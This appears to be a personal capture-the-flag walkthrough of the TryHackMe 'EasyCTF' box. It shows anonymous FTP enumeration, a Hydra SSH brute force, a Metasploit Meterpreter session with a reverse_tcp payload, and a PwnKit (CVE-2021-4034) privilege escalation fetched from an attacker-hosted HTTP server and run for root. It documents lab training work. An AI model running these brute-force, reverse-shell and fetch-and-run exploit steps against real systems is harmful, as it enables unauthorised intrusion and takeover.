Related: [[OSCP/Boxes/THM/(THM) EasyCTF/1enum]] | [[OSCP/Boxes/THM/(THM) EasyCTF/21 ftp]] | [[80 http]] | [[Brute force]] | [[Types of shells]]

# THM - EasyCTF

**Difficulty:** Easy  
**OS:** Linux (Ubuntu, 32-bit / i686)

---

## Open Ports

| Port | Service | Version |
|------|---------|---------|
| 21 | FTP | vsftpd 3.0.3 (anon login allowed) |
| 80 | HTTP | Apache 2.4.18 |
| 2222 | SSH | OpenSSH 7.2p2 |

---

## Step 1 — FTP Enumeration

Anonymous FTP login was allowed. The interactive `ftp` client caused repeated failures because passive mode kept toggling off mid-session. `wget` was more reliable.

### Interactive ftp (unreliable here)

```bash
ftp <ip>
# login: anonymous / (blank)
passive         # toggle passive mode on/off
mget *          # download everything — kept failing due to passive issues
```

### wget — more reliable alternative

```bash
# Passive mode (default for wget)
wget -r ftp://anonymous:@<ip>/

# Active mode — use when passive keeps timing out
wget --no-passive-ftp -r ftp://anonymous:@<ip>/
```

> **Note:** `wget` defaults to passive mode. `--no-passive-ftp` switches to active. The interactive `ftp` client's `passive` command is a toggle, not a setter — easy to accidentally disable it.

---

## Step 2 — SSH Brute Force (Hydra)

FTP brute force failed immediately — the server was rejecting all connection attempts before any auth could happen. Switched to SSH on port 2222.

```bash
hydra -l mitch -P /usr/share/wordlists/rockyou.txt ssh://<ip> -s 2222 -t 4
```

**Credentials found:** `mitch` / `<password>`

---

## Step 3 — Meterpreter Session via MSF ssh_login

Used Metasploit's SSH login scanner to get a session, then upgraded to Meterpreter.

```bash
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <ip>
set RPORT 2222
set USERNAME mitch
set PASSWORD <password>
run

sessions -u <id>    # upgrade the plain shell session to meterpreter
```

---

## Step 4 — Privilege Escalation (CVE-2021-4034 PwnKit)

**pkexec version 0.105** — vulnerable to PwnKit.  
**Target architecture: 32-bit (i686)** — this caused the Metasploit module to fail.

### MSF attempt (failed on 32-bit)

```bash
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set SESSION <id>
set LHOST <ip>
set LPORT 4444
set target 1
set payload linux/x86/meterpreter/reverse_tcp
set ForceExploit true
run
```

The MSF module failed despite setting the x86 payload and target. Fell back to manual exploit.

---

## Step 5 — Transfer Exploit via Python HTTP Server

Zipped the exploit on Kali, served it, downloaded and extracted on target.

```bash
# On Kali — zip the exploit folder
zip -r CVE-2021-4034.zip /path/to/CVE-2021-4034-main

# Navigate to the folder that CONTAINS the zip (python3 serves from CWD)
cd /path/to/folder/containing/zip
python3 -m http.server 8080
```

```bash
# On target
wget http://<kali_ip>:8080/CVE-2021-4034.zip -O /tmp/CVE-2021-4034.zip
unzip /tmp/CVE-2021-4034.zip -d /tmp/
```

> **Note:** `python3 -m http.server` serves files relative to the directory you launch it from, not from `/`. Always `cd` into the folder that directly contains the file before running it.

---

## Step 6 — Run the Manual Exploit

```bash
cd /tmp/CVE-2021-4034-main
make
./cve-2021-4034
```

Root shell obtained.

---

## Key Lessons

- `wget` passive FTP is the default; `--no-passive-ftp` switches to active mode
- The interactive `ftp` client's `passive` command is a **toggle** — easy to accidentally flip it off
- Metasploit's PwnKit module struggles on 32-bit targets even with x86 payload set; manual exploit is more reliable
- `python3 -m http.server` serves from **CWD**, not from `/` — always `cd` to the right folder first
- `LPORT` must not conflict with services already listening on the machine

---

## CVEs / Tools

| Reference | Details |
|-----------|---------|
| CVE-2021-4034 | PwnKit — pkexec LPE, affects pkexec < 0.120 |
| [EDB-50689](https://www.exploit-db.com/exploits/50689) | Manual PwnKit PoC |

